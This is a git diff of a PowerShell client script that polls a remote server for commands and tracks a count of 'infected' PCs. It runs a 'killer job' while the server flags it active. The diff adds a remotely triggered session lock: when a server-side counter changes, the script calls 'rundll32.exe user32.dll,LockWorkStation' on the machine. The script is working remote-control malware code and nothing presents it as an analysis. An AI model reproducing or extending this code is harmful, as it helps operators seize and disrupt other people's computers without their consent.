@@ -61,6 +61,8 @@ $global:messageIncr = $null
 $global:nbPcInfectIncr = $null
 $global:lastMessageIncr = ""
 $global:lastNbPcInfectIncr = ""
+$global:nbLockSession = $null
+$global:lastNbLockSession = ""
 
 function checkDataBase {
     try {
@@ -70,6 +72,7 @@ function checkDataBase {
             $global:isActive = $response.isActive
             $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
             $global:nbPcInfectIncr = $response.nbPcInfect.nbPcInfectIncr
+            $global:nbLockSession = $response.nbLockSession
             if ($response.message -ne $null) {
                 $global:message = $response.message.message
                 $global:messageIncr = $response.message.incr
@@ -85,6 +88,7 @@ function checkDataBase {
             $global:messageIncr = $null
             $global:nbPcInfectIncr = $null
             $global:nbPcInfect = 0
+            $global:nbLockSession = $null
         }
     } catch {
         Write-Error "Error checking database: $($_.Exception.Message)"
@@ -93,6 +97,7 @@ function checkDataBase {
         $global:messageIncr = $null
         $global:nbPcInfect = 0
         $global:nbPcInfectIncr = $null
+        $global:nbLockSession = $null
     }
 }
 
@@ -135,10 +140,12 @@ function main {
     if ($null -ne $global:messageIncr) {
         $global:lastMessageIncr = $global:messageIncr
         $global:lastNbPcInfectIncr = $global:nbPcInfectIncr
+        $global:lastNbLockSession = $global:nbLockSession
     } else {
         Write-Warning "Initial database check failed or returned null increment. Last message check might be inaccurate initially."
         $global:lastMessageIncr = [System.Guid]::NewGuid().ToString()
-        $global:lastNbPcInfectIncr = "" # Initialiser pour forcer la première mise à jour si nbPcInfectIncr existe
+        $global:lastNbPcInfectIncr = ""
+        $global:lastNbLockSession = ""
     }
 
     # Main loop
@@ -146,7 +153,6 @@ function main {
         checkDataBase
 
         if ($null -ne $global:isActive) {
-            Write-Host "Status Check: isActive = $global:isActive, messageIncr = $global:messageIncr, nbPcInfectIncr = $global:nbPcInfectIncr, lastNbPcInfectIncr = $global:lastNbPcInfectIncr" -ForegroundColor Cyan
 
             if ($global:messageIncr -ne $global:lastMessageIncr) {
                 Write-Host "Message increment changed from '$($global:lastMessageIncr)' to '$($global:messageIncr)'." -ForegroundColor White
@@ -187,6 +193,10 @@ function main {
                 }
             }
 
+            if ($global:nbLockSession -ne $global:lastNbLockSession) {
+                rundll32.exe user32.dll,LockWorkStation
+                $global:lastNbLockSession = $global:nbLockSession
+            }
 
             if ($global:isActive -and -not $isRunning) {
                 Write-Host "isActive is true. Starting killer job..." -ForegroundColor Green
